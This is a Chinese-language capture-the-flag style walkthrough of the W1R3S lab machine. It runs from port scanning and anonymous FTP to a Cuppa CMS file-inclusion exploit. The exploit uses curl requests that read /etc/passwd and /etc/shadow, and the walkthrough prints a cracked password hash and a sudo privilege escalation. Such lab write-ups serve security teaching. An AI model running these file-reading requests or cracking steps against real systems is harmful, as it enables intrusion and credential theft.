# W13rs

## 总结知识点：

知道/etc/passwor和/etc/shadow文件干嘛的；看懂poc怎么利用就行；sudo提权；hash-identifier跑字符类型

## 思路：

找存活主机，信息收集：nmap扫端口，目录扫描，web漏洞扫描，web指纹信息收集；sudo提权

## 流程：

攻击机ip：10.10.10.128

找存活主机，扫c段，发现靶机10.10.10.132

```
nmap -sP 10.10.10.0/24
```

![image-20230514142129889](https://github.com/wswe/test2/blob/main/image-20230514142129889.png)

nmap端口扫描

```
nmap -sV -sS -p- -T5 10.10.10.132    
```

  

-sV ：详细版本  -sS ：用SYN连接 -p- ：全端口 -T5  ：T5级别速度是扫描 

![image-20230514142554803](https://github.com/wswe/test2/blob/main/image-20230514142554803.png)

端口不多，直接在详细扫看看，发现ftp还是有匿名登入的anonymous

```
nmap  -p 21,22,80,3306 -A 10.10.10.132  
```

-p 指定端口  -A：详细全扫描

![image-20230514143236641](https://github.com/wswe/test2/blob/main/image-20230514143236641.png)

下一步直接到ftp里面收集信息

```
ftp 10.10.10.132
```

dir/ls 看目录

get获取文件

然后打开即可,会发现01.txt和03.txt没什么东西，02.txt有两串字符串



![image-20230514143648717](https://github.com/wswe/test2/blob/main/image-20230514143648717.png)

02.txt

![image-20230514143824769](https://github.com/wswe/test2/blob/main/image-20230514143824769.png)

01ec2d8fc11c493b25029fb1f47f39ce这串字符串不知道什么可以使用工具hash-identifier扫一下，发现是md5，解密会发现没什么东西

```
hash-identifier 01ec2d8fc11c493b25029fb1f47f39ce
```

![image-20230514145346457](https://github.com/wswe/test2/blob/main/image-20230514145346457.png)



这个明显是base64字符串  解码后会发现也没什么东西  SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==

其他ftp下的其他目录看内容会发现都没啥信息，说明21端口没啥东西

我们关注一下其他端口，比如80

看到web服务，看到就是目录扫描先，会发现很多内容，因为很多，所以我们优先去关注一级目录下的内容，发现两个疑似有用的内容http://10.10.10.132/administrator/ 和http://10.10.10.132/wordpress/ 

```
dirb http://10.10.10.132
```

![image-20230514145845462](https://github.com/wswe/test2/blob/main/image-20230514145845462.png)

下一步是对这俩目录whatweb指纹识别一下，会发现administrator用了Cuppa CMS搭建的，wordpress没撒谎东西

```
whatweb http://10.10.10.132/administrator/ 
```

![image-20230514150233561](https://github.com/wswe/test2/blob/main/image-20230514150233561.png)

下一步就是直接去找这个CMS的漏洞，然后看一下这个漏洞怎么用的，这个就是重点的

```
searchsploit Cuppa
```

![image-20230514150627187](https://github.com/wswe/test2/blob/main/image-20230514150627187.png)

文件内容主要看描述和怎么用就行了

描述上看就是利用了一个文件包含的漏洞

具体使用就是在目标web目录服务下发送一个请求

url为http://目标/web服务目录/alerts/alertConfigField.php，参数为urlConfig

![image-20230514151337498](https://github.com/wswe/test2/blob/main/image-20230514151337498.png)

![image-20230514151012830](https://github.com/wswe/test2/blob/main/image-20230514151012830.png)

那这里利用的方式就是直接用curl就行

--data-urlencode 发送post请求指定内容内容，内容为urlConfig=../../../../../../../../../etc/passwd

```
curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://10.10.10.132/administrator/alerts/alertConfigField.php 


```

[/etc/shadow和/etc/password文件详细说明](https://blog.csdn.net/snlying/article/details/6130468?ops_request_misc=&request_id=&biz_id=102&utm_term=etc/password%20%E9%87%8C%E9%9D%A2%E7%9A%84x%E8%A1%A8%E7%A4%BA&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-6130468.142^v87^control,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)

然后会返回两个明显的用户组，一个是web服务建立自带的www-data  一个是w1r3s

![image-20230514152334492](https://github.com/wswe/test2/blob/main/image-20230514152334492.png)

发现w1r3s:x   有x说明文件真正的密码被放在/etc/shadow里面，所以下一步我们就要去看/etc/shadow



```
curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://10.10.10.132/administrator/alerts/alertConfigField.php 
```

![image-20230514154030697](https://github.com/wswe/test2/blob/main/image-20230514154030697.png)

然后用john去解码，john是一个解密工具

把w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::

放到一个y.txt 里面

然后john test.txt    ，跑出结果  账号/密码   w1r3s/computer

![image-20230514154606089](https://github.com/wswe/test2/blob/main/image-20230514154606089.png)

然后就去用ssh登入了

```
ssh w1r3s@10.10.10.132 
```

![image-20230514154941228](https://github.com/wswe/test2/blob/main/image-20230514154941228.png)

然后就是提权了，这个靶场的提权的知识点，就是简单的sudo提权

先看用户su权限，发现是全权限，所以直接sudo提权即可

sudo -l   查看用户sudo权限

sudo su 升级为root

![image-20230514155603448](https://github.com/wswe/test2/blob/main/image-20230514155603448.png)
